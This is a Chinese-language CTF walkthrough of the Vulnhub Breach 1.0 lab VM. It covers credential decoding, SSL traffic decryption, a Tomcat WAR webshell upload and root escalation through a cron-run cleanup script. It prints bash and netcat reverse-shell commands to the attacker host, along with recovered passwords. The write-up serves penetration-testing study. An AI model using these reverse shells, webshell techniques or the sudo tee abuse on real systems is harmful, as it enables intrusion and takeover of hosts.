*** 本文作者：Setup，本文属FreeBuf原创奖励计划，未经许可禁止转载**

## 简介  

### Vulnhub简介

**Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，大多是Boot2root，从启动虚机到获取操作系统的root权限和查看flag。网址：<https://www.vulnhub.com>。**

### 下载链接

<https://download.vulnhub.com/breach/Breach-1.0.zip>  

### 靶机说明

Breach1.0是一个难度为初级到中级的BooT2Root/CTF挑战。

VM虚机配置有静态IP地址（192.168110 140），需要将虚拟机网卡设置为host-only方式组网。非常感谢Knightmare和rastamouse进行测试和提供反馈。作者期待大家写出文章，特别是通过非预期的方式获取root权限。

## 目标

Boot to root：获得root权限，查看flag。

## 运行环境

> 靶机：网络连接方式设置为主机模式（host-only），静态IP是192.168.110.140。
>
>
> 攻击机：同网段下有Windows攻击机（物理机），IP地址：192.168.110.220，安装有Nmap、Burpsuit、Wireshark、Sqlmap、nc、Python2.7、JDK、DirBuster、AWVS、Nessus等渗透工具，也可以使用Kali
> Linux攻击机。

## 信息收集

### 端口服务识别 ****

启动Breach1.0虚拟机，由于IP已知，使用nmap扫描端口，并做服务识别和深度扫描（加-A参数），扫描结果保存到txt文件，命令：

`nmap -v -A 192.168.110.140 -oN Breach.txt`

![image.png](https://image.3001.net/images/20180510/1525919786850.png!small)  

发现端口几乎全开放了，显然是有问题，虚拟机对端口扫描做了一些防护措施，直接访问80端口，进入web首页：`<http://192.168.110.140/>`

![image.png](https://image.3001.net/images/20180510/1525919795857.png!small)  

## 漏洞挖掘

 **0x01：查看首页源码，解码得到密码**

(1)
查看首页源码，发现提示：`Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo`
这是一串base64编码。

![image.png](https://image.3001.net/images/20180510/15259198355300.png!small)  

(2) 将其复制到Burpsuite
Decoder进行base64解码，解密后发现还是base64编码，继续base64解码，得到`pgibbons:damnitfeel$goodtobeagang$ta`

![image.png](https://image.3001.net/images/20180510/15259198434259.png!small)  

**0x02：登录cms，查看邮件，下载包含SSL证书的密钥库keystore文件**

(1) 点击首页的图片，进入`initech.html`

![image.png](https://image.3001.net/images/20180510/15259198551364.png!small)  

(2) 点击initech.html左边的`Employee
portal`进入到`<http://192.168.110.140/impresscms/user.php>` 这是一个impresscms登录页

![image.png](https://image.3001.net/images/20180510/15259198665169.png!small)  

使用之前两次base64解码得到的密码登录impresscms：

用户名：`pgibbons`

密码：`damnitfeel$goodtobeagang$ta`

![image.png](https://image.3001.net/images/20180510/15259198764488.png!small)  

(3) exploit-db.com查找impress cms漏洞：发现ImpressCMS 1.3.9
SQL注入漏洞：`<https://www.exploit-db.com/exploits/39737/>`可注入页面为`/modules/profile/admin/field.php`，但是该页面目前没有权限访问，无法进行注入。

(4) 注意左边的收件箱Inbox显示有3封邮件，依次打开看：

![image.png](https://image.3001.net/images/20180510/15259198899295.png!small)  

第1封邮件，主要内容：让你的团队只能向管理门户发布任何敏感的内容。我的密码非常安全，发自ImpressCMS Admin Bill，如下：

![image.png](https://image.3001.net/images/20180510/15259198981108.png!small)  

第2封邮件，主要内容：Michael采购了IDS/IPS。

![image.png](https://image.3001.net/images/20180510/15259199076808.png!small)  

第3封邮件，主要内容：有一个peter的SSL证书被保存在192.168.110.140/.keystore

![image.png](https://image.3001.net/images/20180510/1525919917669.png!small)  

(5)
访问`<http://192.168.110.140/.keystore>`下载包含SSL证书的密钥库keystore文件，keystore是存储公私密钥的一种文件格式。

![image.png](https://image.3001.net/images/20180510/15259199254432.png!small)  

**0x03：导入流量抓包文件、SSL证书到Wireshark**

(1) 依次访问左边的菜单树，点击每个菜单栏：

content链接了一张图片troll.gif：

![image.png](https://image.3001.net/images/20180510/15259199378149.png!small)  

点击profile会进入目录浏览：

![image.png](https://image.3001.net/images/20180510/15259199494445.png!small)  

但都没发现可利用漏洞，继续浏览每个网页。

(2) 点击`View Account`菜单进入界面，再依次点击页面的`Content`，会弹出一行链接`Content SSL
implementation test capture`，点击链接，如下图：

![image.png](https://image.3001.net/images/20180510/15259199612664.png!small)  

(3)
进入`<http://192.168.110.140/impresscms/modules/content/content.php?content_id=1>`页面，可以看到一个名为：`_SSL_test_phase1.pcap`的Wireshark流量包文件，下载它。

![image.png](https://image.3001.net/images/20180510/15259199691073.png!small)  

同时，该页面有重要的提示信息：这个pCAP文件是有红色团队的重新攻击产生的，但是不能读取文件。而且`They told me the alias,
storepassword and keypassword are all set to
'tomcat'`别名、Keystore密码、key密码都设置成`tomcat`。

由此推测：a.这是一个流量包文件，不能读取很可能因为某些流量有SSL加密（前面的邮件中提供了一个keystore，这里提供了密码；b.系统中可能存在tomcat。

(4) Windows攻击机安装有JDK，到JDK目录下找到keytool.exe工具：路径`C:\Program
Files\Java\jre1.8.0_121\bin\keytool.exe`

![image.png](https://image.3001.net/images/20180510/15259199803832.png!small)  

将keystore放到C盘根目录，查看keystore这个密钥库里面的所有证书，命令`keytool -list -keystore
c:\keystore` 输入密钥库口令tomcat：

![image.png](https://image.3001.net/images/20180510/15259199895283.png!small)  

(5) 从密钥库导出.p12证书，将keystore拷贝到keytool目录，导出名为：tomcatkeystore.p12的证书，命令：

keytool -importkeystore -srckeystore c:\keystore -destkeystore
c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat

![image.png](https://image.3001.net/images/20180510/15259200006861.png!small)

(6) 将.p12证书导入Wireshark

.p12证书存储在C盘根目录，将证书导入Wireshark：在Wireshark中打开`_SSL_test_phase1.pcap`流量包文件，选择菜单：编辑
--首选项--Protocols--SSL，点击右边的Edit：

![image.png](https://image.3001.net/images/20180510/15259200104091.png!small)  

输入：192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat

![image.png](https://image.3001.net/images/20180510/15259200207948.png!small)  

**0x04：从流量包文件中得到tomcat后台URL和密码**

(1) 导入证书后，https流量已经被解密，查看每个http流量包：

发现从192.168.110.129到192.168.110.140的攻击流量包，其中有cmd命令马执行了id命令，攻击者上传了两张图片，疑似图片马，但是命令马无法直接访问，需要登录tomcat后台：

![image.png](https://image.3001.net/images/20180510/15259200304332.png!small)  

(2) 获得Tomcat后台登录地址和用户名密码

继续观察流量包，发现一个Unauthorized的认证包，该request和response包含了Tomcat后台的登录地址：`<https://192.168.110.140:8443/_M@nag3Me/html>`

![image.png](https://image.3001.net/images/20180510/15259200413992.png!small)  

发现包含登录用户名密码的数据包， 采用http basic认证，认证数据包为：`Basic
dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC`

![image.png](https://image.3001.net/images/20180510/15259200518577.png!small)  

这是base64编码的用户名密码，将`dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC`复制到Burpsuit
Decoder进行解码，得到Tomcat登录用户名密码

![image.png](https://image.3001.net/images/20180510/15259200606672.png!small)  

Tomcat后台登录用户名：tomcat，密码：Tt\5D8F(#!*u=G)4m7zB

## 获取shell

**0x05： 登录Tomcat后台get shell**

(1) 登录tomcat后台：

![image.png](https://image.3001.net/images/20180510/15259200714143.png!small)  

![image.png](https://image.3001.net/images/20180510/15259200805585.png!small)  

(2) Tomcat后台get
shell是有标准姿势的，上养马场，准备好jsp版本的各种马，这里有cmd命令小马，菜刀马，jspspy大马，将其打成caidao.zip压缩包，再将zip压缩包将扩展名改为caidao.war，将war包上传部署即可：

![image.png](https://image.3001.net/images/20180510/15259200891052.png!small)  

(2) 在WAR file to deploy中将war包上传：

![image.png](https://image.3001.net/images/20180510/15259200992774.png!small)  

上传后在目录中找到上传的目录/caidao，已上传jsp木马文件就在这个目录下。

![image.png](https://image.3001.net/images/20180510/15259201103022.png!small)  

(3) 使用中国菜刀连接`<https://192.168.110.140:8443/caidao/caidao.jsp>`

![image.png](https://image.3001.net/images/20180510/15259201219172.png!small)  

(4) 使用菜刀命令行连接，执行id;pwd命令成功：

![image.png](https://image.3001.net/images/20180510/152592013071.png!small)  

(5) 发现的问题：上传的菜刀马，一会儿就会消失，文件被删除，需要重新上传war包才能够继续使用菜刀，主机可能有杀软或者杀web
shell工具。解决方法：bash反弹一个shell出来。

## 提升权限

**0x06： 查看系统用户，发现mysql root密码**

(1) 查看当前系统用户，找id为1000以后的用户 cat /etc/passwd

![image.png](https://image.3001.net/images/20180510/15259201427496.png!small)  

发现两个值得关注的用户：milton 和 blumbergh

(2) 在菜刀里面找到网页根目录，默认是在tomcat目录，找到网页部署目录`/var/www/5446/`

![image.png](https://image.3001.net/images/20180510/15259201516541.png!small)  

(3)
该目录下发现两个奇怪的php文件，命名非常长且无规律fe4db1f7bc038d60776dcb66ab3404d5.php和0d93f85c5061c44cdffeb8381b2772fd.php，使用菜刀下载下来打开查看：

![image.png](https://image.3001.net/images/20180510/15259201638612.png!small)  

这是mysql数据库连接文件，使用mysql的root账号连接数据库，密码为空。

(4) 因为菜刀马总是被删除，所以反弹shell到nc：在菜刀cmd命令行反弹一个shell到Windows攻击机的nc，命令：`echo "bash -i
>& /dev/tcp/192.168.110.220/4444 0>&1" | bash`

![image.png](https://image.3001.net/images/20180510/15259201711548.png!small)  

nc接收反弹sehll成功：

![image.png](https://image.3001.net/images/20180510/15259201796237.png!small)  

(5) 连接mysql数据库，查看mysql用户，这里输入mysql命令后一直没有回显，直到输入exit退出mysql登录后，查询回显才出来，命令：

`mysql -u root -p`

`use mysql;`

`select user,password from user;`

`exit`

![image.png](https://image.3001.net/images/20180510/1525920189591.png!small)  

得到milton用户的密码哈希：`6450d89bd3aff1d893b85d3ad65d2ec2`

到`<https://www.somd5.com/>`解密，得到用户milton的明文密码：thelaststraw

![image.png](https://image.3001.net/images/20180510/15259201978011.png!small)  

**0x07： 提权到用户milton和blumbergh**

(1) 无法执行su命令，显示需要一个终端，之前都遇到这个问题，通过Python解决：

`python -c 'import pty;pty.spawn("/bin/bash")'`

![image.png](https://image.3001.net/images/20180510/15259202056750.png!small)  

(2) 提权到用户milton

`su - milton` 密码：thelaststraw

![image.png](https://image.3001.net/images/20180510/15259202127500.png!small)  

查看milton用户home目录下的some_script.sh文件，没有可利用的信息。

![image.png](https://image.3001.net/images/20180510/15259202218330.png!small)  

(3) 查看系统内核版本，命令`uanme -a`和`cat /etc/issue`

![image.png](https://image.3001.net/images/20180510/15259202303459.png!small)  

系统内核版本为：Linux Breach 4.2.0-27-generic，不存在Ubuntu本地提权漏洞。存在本地提权漏洞内核版本是：Linux
Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04)

![image.png](https://image.3001.net/images/20180510/15259202393249.png!small)  

(4) 查看历史命令，无有价值的线索，看到历史命令su提权到了blumbergh用户。需要找到blumbergh用户的密码。

![image.png](https://image.3001.net/images/20180510/15259202482598.png!small)  

(5) 到现在发现了7张图片，6张在图片目录：`<http://192.168.110.140/images/>`，1张在milton用户目录下：

![image.png](https://image.3001.net/images/20180510/15259202574701.png!small)  

`<http://192.168.110.140/images/bill.png>`

`<http://192.168.110.140/images/initech.jpg>`

`<http://192.168.110.140/images/troll.gif>`

`<http://192.168.110.140/images/cake.jpg>`

`<http://192.168.110.140/images/swingline.jpg>`

`<http://192.168.110.140/images/milton_beach.jpg>`

`milton用户目录下my_badge.jpg`

将图片复制到kali
linux，使用strings打印各图片其中的可打印字符，追加输出到images.txt，在vim下查看，密码在bill.png图片中。

![image.png](https://image.3001.net/images/20180510/15259202676608.png!small)  

找到可能的密码或提示：

![image.png](https://image.3001.net/images/20180510/15259202783488.png!small)  

发现唯一的单词是：`coffeestains`

或者使用exiftool.exe工具查看bill.png图片的exif信息，得到可能的密码：`coffeestains`

![image.png](https://image.3001.net/images/20180510/15259202854816.png!small)  

(6)提权到blumbergh用户

用户名：blumbergh

密码：coffeestains

![image.png](https://image.3001.net/images/20180510/1525920293425.png!small)  

(7)查看历史命令，发现/usr/share/cleanup和tidyup.sh脚本文件：

![image.png](https://image.3001.net/images/20180510/15259203001221.png!small)  

读取tidyup.sh脚本分析：

![image.png](https://image.3001.net/images/20180510/1525920308687.png!small)  

`cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 |
xargs rm -rf`

这是一段清理脚本，描述中说明每3分钟执行清理，删除webapps目录下的文件，因此之前上传的菜刀马总是被删除，需要重新上传。

查看tidyup.sh的权限，对该脚本没有写入权限，只有root可以

![image.png](https://image.3001.net/images/20180510/15259203169582.png!small)  

查看sudo权限，执行sudo -l：

![image.png](https://image.3001.net/images/20180510/1525920324172.png!small)  

发现用户能够以root权限执行这tee程序或tidyup.sh脚本：/usr/bin/tee和/usr/share/cleanup/tidyup.sh

tee命令用于读取标准输入的数据，并将其内容输出成文件。tidyup.sh是清理脚本。

![image.png](https://image.3001.net/images/20180510/15259203345334.png!small)  

**0x07：反弹root权限shell，获取flag**

(1) 向tidyup.sh中写入反弹shell命令

tidyup.sh文件只有root可写，而能够以root权限运行tee命令，那么用tee命令写tidyup.sh：先将反弹shell命令写入shell.txt文件，使用bash反弹shell命令没有成功，于是使用nc命令反弹shell成功，所以写nc反弹命令：

`echo "nc -e /bin/bash 192.168.110.220 5555" > shell.txt`

再使用tee命令将shell.txt内容输出到tidyup.sh

`cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh`

查看tidyup.sh文件写入成功：

`cat /usr/share/cleanup/tidyup.sh`

![image.png](https://image.3001.net/images/20180510/15259203455198.png!small)  

(2) nc监听等待反弹shell，查看权限是root，flag是一张图片,将图片拷贝到home目录：

![image.png](https://image.3001.net/images/20180510/15259203538829.png!small)  

(3) 查看一下crontab计划任务，发现果然有每3分钟执行tidyup.sh清理脚本的任务：

![image.png](https://image.3001.net/images/20180510/15259203614635.png!small)  

(4) 使用之前上传的jsp大马JspSpy将flair.jpg下载到Windows：

![image.png](https://image.3001.net/images/20180510/15259203689064.png!small)  

(5) 查看flag：`I NEED TO TALK ABOUT YOUR FLAIR` 游戏通关。

![image.png](https://image.3001.net/images/20180510/15259203768482.png!small)  

## 总结

****

**主要突破点：**

 ****

> (1) 从网页源码和图片字符中解密出CMS和Tomcat的账号、密码。
>
> (2) 导入ssl证书到Wireshark中解密经过SSL加密的流量，获得Tomcat后台登录URL和账号密码。
>
> (3) Tomcat后台get shell姿势要熟练。
>
> (4) 提权：找到两个账号的密码，发现可以root权限执行的tee命令和tidyup.sh清理脚本，通过计划任务反弹root shell。

****

**难点和踩到的坑：**

 ****

> (1) 使用keytool导出SSL证书：这是非常规渗透知识，需要查阅原理和工具使用，耗费时间较多。
>
> (2) Tomcat后台get shell后，已上传的菜刀马总是被杀，每次传上去过不了几分钟没了，当时以为该系统安装了杀毒软件或web
> shell清理工具，实际是因为主机tidyup.sh清理脚本，每3分钟清理一次。反弹出一个shell就可以持续使用shell了。
>
> (3)
> 连接mysql执行命令，没有回显。菜刀执行命令超时，nc中只有exit退出时才回显，当时打算放弃了，才exit退出，结果退出才有回显，发现了milton账号的密码哈希。山重水复疑无路，柳暗花明又一村。
>
> (4) 花费较多时间进行两次账号切换，再反弹root shell提权。发现和利用tidyup.sh需要较多时间。
>
> (5) 通过crontab的计划任务，反弹root
> shell的方式,在真实渗透测试中是常见的，比如redis的root空口令挖矿，可以ssh证书连接，也可以写root
> crontab反弹，但是在Vulnhub中第一次遇到，对初学者有难度。

 *** 本文作者：Setup，本文属FreeBuf原创奖励计划，未经许可禁止转载**

